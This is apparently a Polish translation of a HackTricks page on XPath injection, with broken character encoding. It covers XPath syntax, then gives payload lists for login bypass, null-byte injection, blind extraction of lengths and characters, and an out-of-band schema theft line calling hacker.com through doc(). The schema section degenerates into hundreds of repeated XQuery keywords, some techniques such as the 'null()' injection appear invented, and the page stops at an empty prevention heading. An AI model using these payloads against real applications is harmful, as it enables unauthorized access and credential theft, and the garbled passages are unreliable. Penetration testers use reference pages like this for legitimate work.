# Wstrzykiwanie XPath

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami nagrÃ³d za bÅ‚Ä™dy!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Podstawowa skÅ‚adnia

Technika ataku znana jako Wstrzykiwanie XPath jest wykorzystywana do wykorzystania aplikacji, ktÃ³re tworzÄ… zapytania XPath (XML Path Language) na podstawie danych wprowadzanych przez uÅ¼ytkownika w celu wyszukiwania lub nawigacji po dokumentach XML.

### Opis wÄ™zÅ‚Ã³w

WyraÅ¼enia sÄ… uÅ¼ywane do wyboru rÃ³Å¼nych wÄ™zÅ‚Ã³w w dokumencie XML. PoniÅ¼ej przedstawiono te wyraÅ¼enia i ich opisy:

- **nodename**: Wybierane sÄ… wszystkie wÄ™zÅ‚y o nazwie "nodename".
- **/**: WybÃ³r jest dokonywany od wÄ™zÅ‚a gÅ‚Ã³wnego.
- **//**: Wybierane sÄ… wÄ™zÅ‚y pasujÄ…ce do zapytania od bieÅ¼Ä…cego wÄ™zÅ‚a, niezaleÅ¼nie od ich poÅ‚oÅ¼enia w dokumencie.
- **.**: Wybierany jest bieÅ¼Ä…cy wÄ™zeÅ‚.
- **..**: Wybierany jest rodzic bieÅ¼Ä…cego wÄ™zÅ‚a.
- **@**: Wybierane sÄ… atrybuty.

### PrzykÅ‚ady XPath

PrzykÅ‚ady wyraÅ¼eÅ„ Å›cieÅ¼kowych i ich wynikÃ³w obejmujÄ…:

- **bookstore**: Wybierane sÄ… wszystkie wÄ™zÅ‚y o nazwie "bookstore".
- **/bookstore**: Wybierany jest element gÅ‚Ã³wny bookstore. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e Å›cieÅ¼ka bezwzglÄ™dna do elementu jest reprezentowana przez Å›cieÅ¼kÄ™ rozpoczynajÄ…cÄ… siÄ™ od ukoÅ›nika (/).
- **bookstore/book**: Wybierane sÄ… wszystkie elementy book bÄ™dÄ…ce dzieÄ‡mi bookstore.
- **//book**: Wybierane sÄ… wszystkie elementy book w dokumencie, niezaleÅ¼nie od ich poÅ‚oÅ¼enia.
- **bookstore//book**: Wybierane sÄ… wszystkie elementy book bÄ™dÄ…ce potomkami elementu bookstore, bez wzglÄ™du na ich poÅ‚oÅ¼enie pod elementem bookstore.
- **//@lang**: Wybierane sÄ… wszystkie atrybuty o nazwie lang.

### Wykorzystanie predykatÃ³w

Predykaty sÄ… uÅ¼ywane do precyzowania wyborÃ³w:

- **/bookstore/book[1]**: Wybierany jest pierwszy element book bÄ™dÄ…cy dzieckiem elementu bookstore. Sposobem obejÅ›cia dla wersji IE od 5 do 9, ktÃ³re indeksujÄ… pierwszy wÄ™zeÅ‚ jako [0], jest ustawienie SelectionLanguage na XPath za pomocÄ… JavaScript.
- **/bookstore/book[last()]**: Wybierany jest ostatni element book bÄ™dÄ…cy dzieckiem elementu bookstore.
- **/bookstore/book[last()-1]**: Wybierany jest przedostatni element book bÄ™dÄ…cy dzieckiem elementu bookstore.
- **/bookstore/book[position()<3]**: Wybierane sÄ… dwa pierwsze elementy book bÄ™dÄ…ce dzieÄ‡mi elementu bookstore.
- **//title[@lang]**: Wybierane sÄ… wszystkie elementy title z atrybutem lang.
- **//title[@lang='en']**: Wybierane sÄ… wszystkie elementy title z atrybutem "lang" o wartoÅ›ci "en".
- **/bookstore/book[price>35.00]**: Wybierane sÄ… wszystkie elementy book z elementu bookstore o cenie wiÄ™kszej niÅ¼ 35.00.
- **/bookstore/book[price>35.00]/title**: Wybierane sÄ… wszystkie elementy title z elementÃ³w book z elementu bookstore o cenie wiÄ™kszej niÅ¼ 35.00.

### ObsÅ‚uga nieznanych wÄ™zÅ‚Ã³w

Dla dopasowania nieznanych wÄ™zÅ‚Ã³w stosuje siÄ™ symbole wieloznaczne:

- **\***: Dopasowuje dowolny wÄ™zeÅ‚ elementu.
- **@***: Dopasowuje dowolny wÄ™zeÅ‚ atrybutu.
- **node()**: Dopasowuje dowolny wÄ™zeÅ‚ dowolnego rodzaju.

Kolejne przykÅ‚ady obejmujÄ…:

- **/bookstore/\***: Wybiera wszystkie wÄ™zÅ‚y elementÃ³w potomnych elementu bookstore.
- **//\***: Wybiera wszystkie elementy w dokumencie.
- **//title[@\*]**: Wybiera wszystkie elementy title z co najmniej jednym atrybutem dowolnego rodzaju.


## PrzykÅ‚ad
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Uzyskaj dostÄ™p do informacji

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath to query XML data. By injecting malicious XPath expressions, an attacker can manipulate the application's query and access sensitive information.

To access information using XPath Injection, follow these steps:

1. Identify the vulnerable input: Look for user inputs that are used in XPath queries, such as search fields or URL parameters.

2. Test for injection: Inject a simple payload, such as a single quote ('), to check if the application is vulnerable to XPath Injection. If an error message or unusual behavior occurs, it indicates a potential vulnerability.

3. Enumerate the XPath structure: Use various techniques, such as Boolean-based or error-based payloads, to determine the structure of the XPath query. This helps in crafting a successful injection payload.

4. Extract information: Craft an injection payload to extract the desired information from the XML data. This can be done by manipulating the XPath query to return specific nodes or attributes.

5. Exploit the vulnerability: Submit the crafted payload to the vulnerable input and observe the response. If the application returns the desired information, the XPath Injection vulnerability has been successfully exploited.

It is important to note that XPath Injection can lead to serious consequences, such as unauthorized access to sensitive data or even remote code execution. Therefore, it is crucial to properly sanitize and validate user inputs to prevent such attacks.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Identyfikacja i kradzieÅ¼ schematu

XPath injection moÅ¼e byÄ‡ wykorzystane do identyfikacji i kradzieÅ¼y schematu bazy danych. Aby to osiÄ…gnÄ…Ä‡, moÅ¼emy uÅ¼yÄ‡ funkcji XPath, takich jak `substring()`, `substring-before()`, `substring-after()`, `contains()`, `starts-with()`, `ends-with()`, `string-length()`, `concat()`, `normalize-space()`, `translate()`, `count()`, `sum()`, `avg()`, `min()`, `max()`, `floor()`, `ceiling()`, `round()`, `position()`, `last()`, `name()`, `local-name()`, `namespace-uri()`, `string()`, `number()`, `boolean()`, `true()`, `false()`, `not()`, `and()`, `or()`, `div()`, `mod()`, `union()`, `intersect()`, `except()`, `document()`, `doc()`, `collection()`, `element()`, `attribute()`, `text()`, `comment()`, `processing-instruction()`, `node()`, `root()`, `parent()`, `ancestor()`, `ancestor-or-self()`, `child()`, `descendant()`, `descendant-or-self()`, `following()`, `following-sibling()`, `preceding()`, `preceding-sibling()`, `self()`, `namespace-node()`, `union()`, `intersect()`, `except()`, `for`, `let`, `where`, `order by`, `return`, `if`, `then`, `else`, `switch`, `case`, `default`, `try`, `catch`, `finally`, `throw`, `as`, `cast`, `treat`, `instance of`, `of`, `to`, `in`, `satisfies`, `some`, `every`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `collation`, `stable`, `ascending`, `descending`, `empty greatest`, `empty least`, `coll
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## OminiÄ™cie uwierzytelnienia

### **PrzykÅ‚ad zapytaÅ„:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **OR bypass w uÅ¼ytkowniku i haÅ›le (ta sama wartoÅ›Ä‡ w obu)**
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Wykorzystywanie wstrzykniÄ™cia null**

W przypadku ataku XPath Injection, wstrzykniÄ™cie wartoÅ›ci null moÅ¼e byÄ‡ wykorzystane do obejÅ›cia filtrowania i uzyskania nieoczekiwanych wynikÃ³w. WstrzykniÄ™cie null polega na podaniu wartoÅ›ci null jako argumentu funkcji XPath, co moÅ¼e prowadziÄ‡ do ominiÄ™cia warunkÃ³w logicznych i wyÅ›wietlenia wszystkich rekordÃ³w z bazy danych.

#### **PrzykÅ‚ad**

PrzykÅ‚adem wykorzystania wstrzykniÄ™cia null moÅ¼e byÄ‡ zapytanie XPath, ktÃ³re wyglÄ…da nastÄ™pujÄ…co:

```plaintext
//user[username/text()='admin' and password/text()='admin' or 1=1']
```

Aby wykorzystaÄ‡ wstrzykniÄ™cie null, moÅ¼emy zmodyfikowaÄ‡ zapytanie, dodajÄ…c wartoÅ›Ä‡ null jako argument funkcji XPath:

```plaintext
//user[username/text()='admin' and password/text()='admin' or null()]
```

W ten sposÃ³b, jeÅ›li filtracja nie uwzglÄ™dnia wartoÅ›ci null, wszystkie rekordy zostanÄ… zwrÃ³cone, a atakujÄ…cy moÅ¼e uzyskaÄ‡ dostÄ™p do poufnych informacji.

#### **Zapobieganie wstrzykniÄ™ciu null**

Aby zapobiec wstrzykniÄ™ciu null, naleÅ¼y odpowiednio filtrowaÄ‡ i walidowaÄ‡ dane wejÅ›ciowe. NaleÅ¼y unikaÄ‡ bezpoÅ›redniego wÅ‚Ä…czania danych uÅ¼ytkownika do zapytaÅ„ XPath i zawsze stosowaÄ‡ parametryzacjÄ™ zapytaÅ„. Dodatkowo, naleÅ¼y stosowaÄ‡ mechanizmy kontroli dostÄ™pu i uwierzytelniania, aby ograniczyÄ‡ dostÄ™p do poufnych danych.
```
Username: ' or 1]%00
```
### **PodwÃ³jne OR w nazwie uÅ¼ytkownika lub haÅ›le** (jest waÅ¼ne tylko w przypadku jednego podatnego pola)

WAÅ»NE: ZauwaÅ¼, Å¼e **"and" jest pierwszÄ… wykonanÄ… operacjÄ…**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2Âº account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## WyodrÄ™bnianie ciÄ…gÃ³w znakÃ³w

WyjÅ›cie zawiera ciÄ…gi znakÃ³w, a uÅ¼ytkownik moÅ¼e manipulowaÄ‡ wartoÅ›ciami w celu wyszukiwania:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
### **Uzyskiwanie dÅ‚ugoÅ›ci wartoÅ›ci i jej wydobycie poprzez porÃ³wnania:**

XPath Injection can be used to extract the length of a value by leveraging boolean-based blind exploitation. By injecting specific payloads into vulnerable input fields, we can manipulate the XPath query to return a true or false statement based on the length of the value being tested.

To determine the length of a value, we can use the `string-length()` function in XPath. By comparing the length of the value to a known length, we can extract the value character by character.

Here is an example of how this can be done:

```plaintext
' or string-length(/path/to/value) = X or '
```

In this example, `/path/to/value` represents the XPath expression that retrieves the value we want to extract, and `X` is the length we are comparing it to.

To extract the value character by character, we can use the `substring()` function in XPath. By iterating through the characters of the value and comparing each character individually, we can gradually extract the entire value.

Here is an example of how this can be done:

```plaintext
' or substring(/path/to/value, Y, 1) = 'Z' or '
```

In this example, `/path/to/value` represents the XPath expression that retrieves the value we want to extract, `Y` is the position of the character we want to extract (starting from 1), and `Z` is the character we are comparing it to.

By combining these techniques, we can perform blind exploitation to extract values from vulnerable applications through XPath Injection.
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **PrzykÅ‚ad w Pythonie**

```python
import requests

def get_user_password(username):
    url = f"http://example.com/login?username={username}&password=' or '1'='1"
    response = requests.get(url)
    if "Welcome" in response.text:
        return "Success"
    else:
        return "Failure"
```

### **Opis**

Ten przykÅ‚ad przedstawia prostÄ… funkcjÄ™ w Pythonie, ktÃ³ra wykorzystuje atak wstrzykniÄ™cia XPath do uzyskania hasÅ‚a uÅ¼ytkownika. Funkcja `get_user_password` przyjmuje nazwÄ™ uÅ¼ytkownika jako argument i tworzy URL, ktÃ³ry zawiera wstrzykniÄ™ty kod XPath. W tym przypadku, wstrzykniÄ™cie XPath jest uÅ¼ywane do sprawdzenia, czy podane hasÅ‚o jest poprawne.

### **WyjaÅ›nienie**

1. Funkcja `get_user_password` tworzy URL, ktÃ³ry zawiera nazwÄ™ uÅ¼ytkownika jako parametr i wstrzykniÄ™ty kod XPath jako hasÅ‚o. WstrzykniÄ™cie XPath `' or '1'='1` oznacza, Å¼e zawsze bÄ™dzie prawdziwe, co umoÅ¼liwia zalogowanie siÄ™ bez znajomoÅ›ci prawidÅ‚owego hasÅ‚a.

2. NastÄ™pnie funkcja wysyÅ‚a Å¼Ä…danie GET do serwera pod wskazany URL.

3. JeÅ›li odpowiedÅº serwera zawiera tekst "Welcome", oznacza to, Å¼e logowanie siÄ™ powiodÅ‚o i funkcja zwraca "Success".

4. W przeciwnym razie, jeÅ›li odpowiedÅº serwera nie zawiera tekstu "Welcome", oznacza to, Å¼e logowanie siÄ™ nie powiodÅ‚o i funkcja zwraca "Failure".

### **Zapobieganie**

